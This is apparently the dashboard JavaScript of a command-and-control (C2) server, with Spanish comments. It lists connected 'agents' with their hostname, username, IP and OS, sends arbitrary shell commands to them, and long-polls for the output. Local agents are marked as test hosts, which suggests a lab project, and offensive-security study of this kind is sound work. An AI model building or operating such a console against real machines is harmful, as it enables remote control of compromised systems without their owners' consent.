// Dashboard JavaScript - Polling de agents, envío de comandos y long poll de resultados
const AUTH_TOKEN = window.C2_AUTH_TOKEN;
const API_BASE = '';
const POLL_INTERVAL = 5000; // Actualización de la lista de agents: 5 segundos

// Almacén de resultados confirmados por agent: { output, task_id }
const agentResults = {};

// Tareas pendientes: agent_id -> { taskId, controller (AbortController) }
const pendingTasks = {};

// ── API ────────────────────────────────────────────────────────────────────

async function fetchAgents() {
    try {
        const response = await fetch(`${API_BASE}/agents`, {
            headers: { 'X-Auth-Token': AUTH_TOKEN }
        });
        if (!response.ok) throw new Error('Failed to fetch agents');
        return await response.json();
    } catch (error) {
        console.error('Error fetching agents:', error);
        return null;
    }
}

async function sendCommand(agentId, command) {
    const response = await fetch(`${API_BASE}/task/${agentId}`, {
        method: 'POST',
        headers: {
            'X-Auth-Token': AUTH_TOKEN,
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ command })
    });
    if (!response.ok) {
        const data = await response.json();
        throw new Error(data.error || data.reason || 'Failed to send command');
    }
    return await response.json();
}

async function fetchResults(agentId) {
    try {
        const response = await fetch(`${API_BASE}/results/${agentId}`, {
            headers: { 'X-Auth-Token': AUTH_TOKEN }
        });
        if (!response.ok) throw new Error('Failed to fetch results');
        return await response.json();
    } catch (error) {
        console.error('Error fetching results:', error);
        return null;
    }
}

// Long poll: una sola petición que espera hasta 25s en el servidor
async function waitForResult(agentId, taskId, abortSignal) {
    try {
        const response = await fetch(
            `${API_BASE}/wait_result/${agentId}/${taskId}?timeout=25`,
            {
                headers: { 'X-Auth-Token': AUTH_TOKEN },
                signal: abortSignal,
            }
        );
        if (response.status === 408) return null; // servidor llegó al timeout, reintentar
        if (!response.ok) throw new Error(`HTTP ${response.status}`);
        const data = await response.json();
        return data.result || null;
    } catch (e) {
        if (e.name === 'AbortError') return 'cancelled';
        console.error('waitForResult error:', e);
        return null;
    }
}

// ── HELPERS ────────────────────────────────────────────────────────────────

function timeAgo(timestamp) {
    const seconds = Math.floor(Date.now() / 1000 - timestamp);
    if (seconds < 60) return `${seconds}s ago`;
    if (seconds < 3600) return `${Math.floor(seconds / 60)}m ago`;
    return `${Math.floor(seconds / 3600)}h ago`;
}

function isLocalAgent(agent) {
    return agent.ip === '127.0.0.1' || agent.ip === '::1' || agent.ip.startsWith('127.');
}

// ── RENDER ─────────────────────────────────────────────────────────────────

function renderAgent(agent) {
    const isOnline = agent.status === 'online';
    const result = agentResults[agent.agent_id];
    const testBadge = isLocalAgent(agent) ? '<span class="agent-badge-test">TEST</span>' : '';

    return `
        <div class="agent-card ${isOnline ? '' : 'offline'} ${isLocalAgent(agent) ? 'local-agent' : ''}"
             data-agent-id="${agent.agent_id}">
            <div class="agent-header">
                <span class="agent-id">${agent.agent_id}</span>
                ${testBadge}
                <span class="agent-status ${agent.status}">${agent.status}</span>
            </div>
            <div class="agent-info">
                <div>
                    <label>Hostname</label>
                    <span>${agent.hostname}</span>
                </div>
                <div>
                    <label>Username</label>
                    <span>${agent.username}</span>
                </div>
                <div>
                    <label>IP</label>
                    <span>${agent.ip}</span>
                </div>
                <div>
                    <label>OS</label>
                    <span>${agent.os}</span>
                </div>
                <div>
                    <label>Last Seen</label>
                    <span class="agent-last-seen">${timeAgo(agent.last_seen)}</span>
                </div>
            </div>
            <div class="agent-commands">
                <input type="text"
                       id="cmd-${agent.agent_id}"
                       placeholder="Enter command (whoami, ls, cat, ps...)"
                       onkeypress="if(event.key==='Enter') executeCommand('${agent.agent_id}')">
                <button id="send-${agent.agent_id}"
                        class="cmd-send"
                        onclick="executeCommand('${agent.agent_id}')">Send</button>
                <button class="cmd-refresh"
                        onclick="refreshResults('${agent.agent_id}')">Refresh</button>
            </div>
            <div class="agent-result ${result ? 'visible' : ''} ${result?.error ? 'error' : 'success'}"
                 id="result-${agent.agent_id}">
                ${result ? (result.error || result.output || 'No output') : ''}
            </div>
        </div>
    `;
}

function updateAgentCard(card, agent) {
    const statusEl = card.querySelector('.agent-status');
    if (statusEl) {
        statusEl.className = `agent-status ${agent.status}`;
        statusEl.textContent = agent.status;
    }
    const lastSeenEl = card.querySelector('.agent-last-seen');
    if (lastSeenEl) {
        lastSeenEl.textContent = timeAgo(agent.last_seen);
    }
    card.classList.toggle('offline', agent.status !== 'online');
}

// ── DASHBOARD ──────────────────────────────────────────────────────────────

async function updateDashboard() {
    const data = await fetchAgents();
    if (!data) return;

    const agents = data.agents || [];
    const online = agents.filter(a => a.status === 'online').length;

    document.getElementById('total-agents').textContent = agents.length;
    document.getElementById('online-agents').textContent = online;
    document.getElementById('offline-agents').textContent = agents.length - online;

    const container = document.getElementById('agents-list');

    if (agents.length === 0) {
        container.innerHTML = '<p class="loading">No agents connected</p>';
        return;
    }

    const loadingEl = container.querySelector('.loading');
    if (loadingEl) loadingEl.remove();

    const currentIds = new Set(agents.map(a => a.agent_id));
    container.querySelectorAll('.agent-card[data-agent-id]').forEach(card => {
        if (!currentIds.has(card.dataset.agentId)) card.remove();
    });

    agents.forEach(agent => {
        const existing = container.querySelector(`[data-agent-id="${agent.agent_id}"]`);
        if (existing) {
            updateAgentCard(existing, agent);
        } else {
            const wrapper = document.createElement('div');
            wrapper.innerHTML = renderAgent(agent);
            container.appendChild(wrapper.firstElementChild);
        }
    });
}

// ── COMMAND EXECUTION ──────────────────────────────────────────────────────

async function executeCommand(agentId) {
    const input = document.getElementById(`cmd-${agentId}`);
    const sendBtn = document.getElementById(`send-${agentId}`);
    const command = input.value.trim();
    if (!command) return;

    if (sendBtn) sendBtn.disabled = true;

    const resultDiv = document.getElementById(`result-${agentId}`);
    resultDiv.className = 'agent-result visible';
    resultDiv.textContent = 'Sending command...';

    try {
        const data = await sendCommand(agentId, command);
        const taskId = data.task?.task_id;
        resultDiv.textContent = `Waiting for agent... (task: ${taskId?.slice(0, 8) ?? '?'})`;
        input.value = '';
        startResultPolling(agentId, taskId);
    } catch (error) {
        resultDiv.className = 'agent-result visible error';
        resultDiv.textContent = `Error: ${error.message}`;
    } finally {
        if (sendBtn) sendBtn.disabled = false;
    }
}

// ── LONG POLL DE RESULTADOS ────────────────────────────────────────────────

async function startResultPolling(agentId, taskId) {
    // Cancelar cualquier espera anterior (aborta la conexión HTTP abierta)
    stopResultPolling(agentId);

    const controller = new AbortController();
    pendingTasks[agentId] = { taskId, controller };

    const MAX_RETRIES = 3; // 3 × 25s = 75s máximo de espera total

    for (let attempt = 0; attempt < MAX_RETRIES; attempt++) {
        // Verificar que esta tarea sigue siendo la activa
        if (!pendingTasks[agentId] || pendingTasks[agentId].taskId !== taskId) return;

        const result = await waitForResult(agentId, taskId, controller.signal);

        if (result === 'cancelled') return; // stopResultPolling llamado externamente

        if (result) {
            agentResults[agentId] = { output: result.output, task_id: result.task_id };
            const resultDiv = document.getElementById(`result-${agentId}`);
            if (resultDiv) {
                resultDiv.className = 'agent-result visible success';
                resultDiv.textContent = result.output || '(empty output)';
            }
            delete pendingTasks[agentId];
            return;
        }

        // 408 timeout del servidor — actualizar mensaje y reintentar
        const resultDiv = document.getElementById(`result-${agentId}`);
        if (resultDiv && pendingTasks[agentId]) {
            const elapsed = (attempt + 1) * 25;
            resultDiv.textContent = `Waiting for agent... (${elapsed}s elapsed)`;
        }
    }

    // Sin respuesta tras todos los reintentos
    const resultDiv = document.getElementById(`result-${agentId}`);
    if (resultDiv && pendingTasks[agentId]) {
        resultDiv.className = 'agent-result visible';
        resultDiv.textContent = 'Agent did not respond. Click Refresh to check manually.';
    }
    delete pendingTasks[agentId];
}

function stopResultPolling(agentId) {
    if (pendingTasks[agentId]) {
        pendingTasks[agentId].controller?.abort();
        delete pendingTasks[agentId];
    }
}

// Refrescar resultados manualmente
async function refreshResults(agentId) {
    const data = await fetchResults(agentId);
    const resultDiv = document.getElementById(`result-${agentId}`);
    const pending = pendingTasks[agentId];

    if (!data?.results?.length) {
        resultDiv.className = 'agent-result visible';
        resultDiv.textContent = 'No results yet';
        return;
    }

    if (pending?.taskId) {
        // Hay una tarea esperando: buscar su resultado específico
        const match = data.results.find(r => r.task_id === pending.taskId);
        if (match) {
            agentResults[agentId] = { output: match.output, task_id: match.task_id };
            resultDiv.className = 'agent-result visible success';
            resultDiv.textContent = match.output || '(empty output)';
            stopResultPolling(agentId);
        } else {
            resultDiv.className = 'agent-result visible';
            resultDiv.textContent = `Still waiting for task ${pending.taskId.slice(0, 8)}...`;
        }
    } else {
        // Sin tarea pendiente: mostrar el último resultado
        const latest = data.results[data.results.length - 1];
        agentResults[agentId] = { output: latest.output, task_id: latest.task_id };
        resultDiv.className = 'agent-result visible success';
        resultDiv.textContent = latest.output || '(empty output)';
    }
}

// ── INIT ───────────────────────────────────────────────────────────────────

function init() {
    updateDashboard();
    setInterval(updateDashboard, POLL_INTERVAL);
}

document.addEventListener('DOMContentLoaded', init);
